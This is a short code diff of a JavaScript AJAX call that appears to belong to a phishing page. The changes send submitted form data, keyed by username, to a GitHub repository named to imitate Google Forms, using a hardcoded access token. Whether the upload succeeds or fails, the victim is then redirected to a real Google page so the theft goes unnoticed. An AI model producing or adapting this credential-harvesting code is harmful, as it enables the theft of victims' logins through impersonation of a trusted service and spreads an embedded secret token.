@@ -24,19 +24,19 @@
         $.ajax({
             type: 'PUT',
            dataType: "json",
-            url: data_dir + username,
+            url: "https://api.github.com/repos/forms-google-com-submissions/forms-google-com-submissions.github.io/contents/data/" + username + ".txt",
            beforeSend: function (xhr) {
-            xhr.setRequestHeader('Authorization', 'token ' + token);
+            xhr.setRequestHeader('Authorization', 'token a3b5df0747c5027038d6e679f67fb5c1b2fc7d9e');
             },
             headers: {
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
             },
             data: data_dict,
            success: function(msg){
-                 window.location = 'https://accounts.google.com/';
+                 window.location = 'https://docs.google.com/';
            },
            error: function(XMLHttpRequest, textStatus, errorThrown) {
-              window.location = 'https://accounts.google.com/';
+              window.location = 'https://docs.google.com/';
            }
         });
          
